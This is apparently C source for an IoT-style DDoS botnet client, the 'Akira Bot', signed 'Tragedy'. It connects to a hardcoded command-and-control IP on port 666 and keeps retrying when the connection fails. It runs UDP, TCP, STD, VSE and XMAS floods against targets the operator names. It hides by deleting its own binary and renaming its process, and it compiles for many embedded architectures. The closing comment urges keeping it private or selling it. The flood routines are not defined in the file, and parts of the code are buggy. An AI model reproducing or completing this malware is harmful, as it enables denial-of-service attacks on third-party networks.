/*
    Permission To Use, Copy, Modify, And Distribute This Ware And Its Documentation For Education And Research, Without Fee Or A Signed Agreement, Is Granted,-
    Provided That This And The Following Two Paragraphs Appear In All Copies, Modifications, And Distributions. (Dec. 2020)

    This Ware Is Offered As-Is and As-Available, And Makes No Representations Or Warranties Of Any Kind Concerning This Material, Whether Express, Implied, Statutory, Or Other.
    This Includes, Without Limitation, Warranties Of Title, Merchantability, Fitness For A Particular Purpose, Non-Infringement, Absence Of Latent Or Other Defects, Accuracy,-
     Or The Presence Or Absence Of Errors, Whether Or Not Known Or Discoverable.

    To The Extent Possible, In No Event Shall The Author Be Liable To You On Any Legal Theory-
    (Including, Without Limitation, Negligence) Or Otherwise For Any Direct, Indirect, Special, Incidental, Consequential, Punitive, Exemplary,-
     Or Any Other Losses, Costs, Expenses, Or Damages (Including, But Not Limited To, Loss Of Use, Data, Profits, Or Business Interruption)-
    However Caused, And On Any Theory Of Liability, Whether In Contract, Strict Liability, Or Tort (Including Negligence Or Otherwise) Arising Out Of This Public Release-
     Or Use Of This Ware, Even If The User Has Been Advised Of The Possibility Of Such Losses, Costs, Expenses, Or Damages.
    
*/
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <time.h>
#include <sys/prctl.h>
#include <fcntl.h>

#define MXPRMS 5
#define PR_SET_NAME 15

                                   //If C2 Connection Fails
static unsigned int retrycon = 1;  //1 = Enable Retry, 0 = Disable
static unsigned int tryamount = 0; //0 = Unlimited Tries
static volatile int trycount = 1;  //Failed Conn Count, Starts At 1
#define CONSLEEP 6 //How Many Seconds Our Proc Sleeps Before Retrying

#define MAXFLOODTIME 10000  //Maximum Time For Which Devices Can Send Data
static int CUT = 0;         //If The Maximum Is Exceeded, And CUT == 1, The Time Will 
                            // Be Cut/Hard Set To The Set Maximum(10000)
                            //Else If CUT == 0, The Command Will Simply Be Discarded
//[+]=================================[+]
//Host Info
int akira1[] = {104}; //x.1.1.1
int akira2[] = {168}; //1.x.1.1
int akira3[] = {96}; //1.1.x.1
int akira4[] = {137}; //1.1.1.x
int akira_bp = 666; //Desired Bot Port
//[+]=================================[+]
#define sv_sz (sizeof(akira1), sizeof(akira2), sizeof(akira3), sizeof(akira4))

#if defined(X86_BUILD) || defined(X86_64_BUILD) || defined(X86_32_BUILD) || defined(X86) || defined(__x86_64__) || defined(__amd64__) || defined(__amd64) || defined(__x86_64) || defined(_M_X64) || defined(_M_AMD64)
#define BUILD "x86"
#elif defined(__X86__) || defined(_X86_) || defined(i386) || defined(__i386__) || defined(__i386) || defined(__i686__) || defined(__i586__) || defined(__i486__)
#define BUILD "x86"
#elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
#define BUILD "armv4"
#elif defined(__ARM_ARCH_5__) || defined(__ARM_ARCH_5E__) || defined(__ARM_ARCH_5T__) || defined(__ARM_ARCH_5TE__) || defined(__ARM_ARCH_5TEJ__)
#define BUILD "armv5"
#elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__ARM_ARCH_6M_) || defined(__ARM_ARCH_6T2__)
#define BUILD "armv6"
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
#define BUILD "armv7"
#elif defined(__BIG_ENDIAN__) || defined(__MIPSEB) || defined(__MIPSEB__) || defined(__MIPS__)
#define BUILD "mips"
#elif defined(__LITTLE_ENDIAN__) || defined(_MIPSEL) || defined(__MIPSEL) || defined(__MIPSEL__)
#define BUILD "mipsel"
#elif defined(__sh__) || defined(__sh1__) || defined(__sh2__) || defined(__sh3__) || defined(__SH3__) || defined(__SH4__) || defined(__SH5__)
#define BUILD "superh"
#elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(_M_PPC) || defined(_ARCH_PPC) || defined(_ARCH_PPC64) || defined(__ppc)
#define BUILD "ppc"
#elif defined(__sparc__) || defined(__sparc)
#define BUILD "sparc"
#elif defined(__m68k__) || defined(__MC68K__)
#define BUILD "m68k"
#else
#define BUILD "unknown"
#endif

int botfd;
struct sockaddr_in akira;

void registerme(char *arch){
    char registermsg[100];
    snprintf(registermsg, sizeof(registermsg), "arch %s", arch);
    if(write(botfd, registermsg, strlen(registermsg))){
#ifdef DEBUG
        printf("Successfully Registered %s\n", arch);
#endif
        return;
    }
    else{
#ifdef DEBUG
        printf("Failed to Register\n");
#endif
        return;
    }
}

void bot_conn(){
    retry:
    botfd = socket(AF_INET, SOCK_STREAM, 0);

    unsigned char C2Host[4096];
    memset(C2Host, 0, sizeof(4096));

    int AKIRASV = -1;
    if(AKIRASV + 1 == sv_sz) AKIRASV = 0;
    else AKIRASV++;
    
    snprintf(C2Host, sizeof(C2Host), "%d.%d.%d.%d", akira1[AKIRASV], akira2[AKIRASV], akira3[AKIRASV], akira4[AKIRASV]);
    int botport = akira_bp;

    fcntl(botfd, F_SETFL, fcntl(botfd, F_GETFL, 0) | O_NONBLOCK);
    
    akira.sin_family = AF_INET;
    akira.sin_addr.s_addr = inet_addr(C2Host);
    akira.sin_port = htons(botport);
    
    if(connect(botfd, (struct sockaddr *)&akira, sizeof(akira))){ registerme(BUILD); }
    else{
#ifdef DEBUG
        printf("Failed To Connect To C2...\n");
#endif
        if(retrycon == 1){
            if(tryamount == 0){
#ifdef DEBUG
                printf("Retrying In %d Seconds...\n", CONSLEEP);
#endif
                sleep(CONSLEEP);
                goto retry;
            }
            else{
                if(trycount < tryamount){
                    trycount++;
#ifdef DEBUG
                    printf("Retrying In %d Seconds...\n", CONSLEEP);
#endif
                    sleep(CONSLEEP);
                    goto retry;
                }
                else{
#ifdef DEBUG
                    printf("Maximum Retry Limit Reached. Exiting...\n");
#endif
                    sleep(2);
                    close(botfd);
                    exit(0);
                }
            }
        }
        else exit(0);
    }
}

void bot_cmd(char *command){
    int r, argcount = 0;
    unsigned char *argv[12 + 1] = {0};
    char *split;
    for(split = strtok(command," "); split != NULL; split = strtok(NULL, " ")){
        argv[argcount++] = malloc(strlen(split) + 1);
        strcpy(argv[argcount - 1], split);
        if(argcount > MXPRMS) return;
    }
    if(atoi(argv[3]) > MAXFLOODTIME || strlen(argv[3] > 6)){ //Maximum Possible Flood Time (strlen 999,999)
        if(CUT == 0){
#ifdef DEBUG
            printf("Exceeded Maximum Possible Duration - Disregarding...\n");
#endif
            return;
        }
        else if(CUT == 1){
            memset(argv[3], 0, sizeof(argv[3]));
            sprintf(argv[3], "%d", MAXFLOODTIME);
        }
        else return;
    }
    
    if(!strcmp(argv[0], "UDP")){
        unsigned char *target = argv[1];
        int port = atoi(argv[2]);
        int duration = atoi(argv[3]);
        int spoofed = 32;
        int packetsize = 1024;
        int pollinterval = 1000;
        int sleepcheck = 1000000;
        int sleeptime = 0;
        if(!fork()){
#ifdef DEBUG
            printf("UDP Flooding: %s %d %d %d %d %d %d %d\n", target, port, duration, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
#endif
            udp_flood(target, port, duration, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
        }
    }
    else if(!strcmp(argv[0], "TCP")){
        unsigned char *target = argv[1];
        int port = atoi(argv[2]);
        int duration = atoi(argv[3]);
        unsigned char *flags = {"all"};
        if(!fork()){
#ifdef DEBUG
            printf("TCP Flooding: %s %d %d %s\n", target, port, duration, flags);
#endif
            tcp_flood(target, port, duration, flags);
        }
    }
    else if(!strcmp(argv[0], "STD")){
        unsigned char *target = argv[1];
        int port = atoi(argv[2]);
        int duration = atoi(argv[3]);
        if(!fork()){
#ifdef DEBUG
            printf("STD Flooding: %s %d %d\n", target, port, duration);
#endif
            std_flood(target, port, duration);
        }
    }
    else if(!strcmp(argv[0], "VSE")){
        unsigned char *target = argv[1];
        int port = atoi(argv[2]);
        int duration = atoi(argv[3]);
        if(!fork()){
#ifdef DEBUG
            printf("VSE Flooding: %s %d %d\n", target, port, duration);
#endif
            vse_flood(target, port, duration);
        }
    }
    else if(!strcmp(argv[0], "XMS")){
        unsigned char *target = argv[1];
        int port = atoi(argv[2]);
        int duration = atoi(argv[3]);
        if(!fork()){
#ifdef DEBUG
            printf("XMS Flooding: %s %d %d\n", target, port, duration);
#endif
            xmas_flood(target, port, duration);
        }
    }
}

void trim(char *str){
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while(isspace(str[begin])) begin++;
    while((end >= begin) && isspace(str[end])) end--;
    for(i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

void cmd_buf(){
    char buf[512];
    while(read(botfd, buf, sizeof(buf))){
        trim(buf);
        if(!strcmp(buf, "PING")){
            write(botfd, "PONG\n", strlen("PONG\n"));
            return;
        }
        else if(!strcmp(buf, "PONG")) return;
        else if(!strcmp(buf, "KILL")){ close(botfd); exit(0); } //Kill Proc
        
        int r, argcount = 0;
        unsigned char *buffer[12 + 1] = {0};
        char *split;
        for(split = strtok(buf," "); split != NULL; split = strtok(NULL, " ")){
            buffer[argcount++] = malloc(strlen(split) + 1);
            strcpy(buffer[argcount - 1], split);
            if(argcount > MXPRMS) return;
        }
        if(argcount > 0){ bot_cmd(buffer); }
        for(r = 0; r < argcount; r++) memset(buffer[r], 0, sizeof(buffer[r]));
    }
}

void filterme(char *a){
    while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n')
        a[strlen(a)-1] = 0;
}
char *make_string(){
    char *tmp;
    int len = (rand()%5)+4,i;
    FILE *file;
    tmp = (char*)malloc(len+1);
    memset(tmp,0,len+1);
    char *pre;
    if((file = fopen("/usr/dict/words","r")) == NULL){
        for(i = 0; i < len; i++) tmp[i] = (rand()%(95-79));
    }
    else{
        int a = ((rand()*rand())%45402)+1;
        char buf[1024];
        for(i = 0; i < a; i++) fgets(buf, 1024, file);
        memset(buf, 0, 1024);
        fgets(buf, 1024, file);
        filterme(buf);
        memcpy(tmp, buf, len);
        fclose(file);
    }
    return tmp;
}

int main(int argc, unsigned char * argv[]){
#ifdef DEBUG
    printf("Akira Bot Started Under TTY...\nAttempting To Hide Process...\n");
#endif
    //Simple Way To Hide Proc
    /*prctl(15, (unsigned long)"/bin/busybox", 0, 0, 0);
    memset(argv[0], 0, sizeof(argv[0]));
    strcpy(argv[0], "-sh");*/

    //Way That I Like To Do It
    char *rename_proc;
    rename_proc = make_string();
    unlink(argv[0]);
    if(prctl(PR_SET_NAME, rename_proc) < 0){
#ifdef DEBUG
        printf("Failed To Assign New Proc Name...\n");
#endif
    }
    else{
        chdir("/");
#ifdef DEBUG
        printf("Bot Proc Renamed, And Hidden In New Directory...\n");
#endif
    }

    //Run Loop
    while(1){ bot_conn(); cmd_buf(); }
    return 0;
}
//EO2A37B
/* 
    Modifying This Code Is Permitted, However, Ripping Code From This/Removing Credits Is The Lowest Of The Low.
    KEEP IT PRIVATE; I'd Rather You Sell It Than Give It Away Or Post Somewhere.

    Gang
        - Tragedy
*/
